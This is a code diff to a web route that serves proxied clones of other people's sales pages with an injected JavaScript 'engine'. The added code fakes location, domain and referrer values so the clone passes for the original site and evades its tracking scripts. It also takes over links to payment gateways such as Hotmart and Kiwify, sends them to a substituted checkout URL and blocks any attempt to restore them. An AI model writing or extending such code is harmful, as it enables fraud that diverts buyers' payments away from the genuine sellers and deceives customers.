@@ -67,7 +67,7 @@ export async function GET(
     const engineScript = `
       <script id="snapfunnel-engine-v7">
         (function() {
-          console.log("SnapFunnel Engine v7.3 - God Mode Stable");
+          console.log("SnapFunnel Engine v7.4 - God Mode SPA Edition");
           const CHECKOUT_URL = '${checkoutUrl}';
           const TARGET_HOST = '${targetHost}';
           const TARGET_ORIGIN = '${baseUrl}';
@@ -75,30 +75,28 @@ export async function GET(
           const PROXY_URL = '${currentOrigin}/api/proxy?url=';
           const originalPathname = window.location.pathname;
 
-          // 1. DEEP SPOOFING (Enganar Scripts de SPA)
+          // 1. DEEP SPOOFING (Enganar Scripts de SPA e Utmify)
           try {
             window.__PROXY_HOST__ = TARGET_HOST;
             window.__PROXY_ORIGIN__ = TARGET_ORIGIN;
             
             const spoof = (obj, prop, value) => {
               try {
-                const originalDescriptor = Object.getOwnPropertyDescriptor(obj, prop);
                 Object.defineProperty(obj, prop, {
                   get: () => value,
-                  set: (v) => { 
-                    if (originalDescriptor && originalDescriptor.set) originalDescriptor.set.call(obj, v);
-                    else obj[prop] = v;
-                  },
+                  set: (v) => { console.log("Blocking set on " + prop); },
                   configurable: true,
                   enumerable: true
                 });
-              } catch(e) { console.error("Spoof error:", e); }
+              } catch(e) {}
             };
 
             spoof(window.location, 'hostname', TARGET_HOST);
             spoof(window.location, 'host', TARGET_HOST);
             spoof(window.location, 'origin', TARGET_ORIGIN);
             spoof(window.location, 'pathname', TARGET_PATH);
+            spoof(document, 'domain', TARGET_HOST);
+            spoof(document, 'referrer', TARGET_ORIGIN + '/');
 
             // Interceptar mudanças de URL via History API
             const _pushState = history.pushState;
@@ -114,7 +112,7 @@ export async function GET(
           } catch(e) {}
 
           // 2. INTERCEPTOR DE CHECKOUT E ÂNCORAS
-          const gateways = ['checkout', 'pay', 'comprar', 'hotmart', 'eduzz', 'monetizze', 'kiwify', 'braip', 'cakto', 'perfectpay', 'ticto', 'yampi', 'cartpanda', 'greenn', 'pepper'];
+          const gateways = ['checkout', 'pay', 'comprar', 'hotmart', 'eduzz', 'monetizze', 'kiwify', 'braip', 'cakto', 'perfectpay', 'ticto', 'yampi', 'cartpanda', 'greenn', 'pepper', 'lowify'];
           
           function patch(el) {
             if (el.tagName === 'A') {
@@ -127,14 +125,19 @@ export async function GET(
                   try {
                     const target = document.querySelector(hrefAttr);
                     if (target) target.scrollIntoView({ behavior: 'smooth' });
-                    else window.location.hash = hrefAttr;
                   } catch(err) {}
                 }, true);
                 return;
               }
 
               if (CHECKOUT_URL && (gateways.some(g => href.includes(g)) || el.dataset.checkout)) {
-                el.href = CHECKOUT_URL;
+                // Proteção contra scripts que tentam reverter o link (ex: Utmify)
+                Object.defineProperty(el, 'href', {
+                  get: () => CHECKOUT_URL,
+                  set: () => {}, // Bloqueia qualquer tentativa de mudar o link de volta
+                  configurable: true
+                });
+                el.setAttribute('href', CHECKOUT_URL);
                 el.addEventListener('click', (e) => {
                   e.preventDefault(); e.stopPropagation();
                   const u = new URL(CHECKOUT_URL);
@@ -144,22 +147,12 @@ export async function GET(
                 }, true);
               }
             }
-            if (el.tagName === 'BUTTON') {
-              const text = (el.textContent || '').toLowerCase();
-              if (CHECKOUT_URL && ['comprar','adquirir','garantir','quero','assinar','buy'].some(t => text.includes(t))) {
-                el.addEventListener('click', (e) => {
-                  e.preventDefault(); e.stopPropagation();
-                  window.location.href = CHECKOUT_URL;
-                }, true);
-              }
-            }
           }
 
           const obs = new MutationObserver(m => m.forEach(r => r.addedNodes.forEach(n => {
             if (n.nodeType === 1) { 
               patch(n); 
               n.querySelectorAll('a, button').forEach(patch);
-              // Interceptar injeção de scripts dinâmicos (comum em Vite)
               if (n.tagName === 'SCRIPT' && n.src && !n.src.includes('/api/proxy')) {
                 const originalSrc = n.src;
                 n.src = PROXY_URL + encodeURIComponent(originalSrc) + '&overrideHost=' + TARGET_HOST;
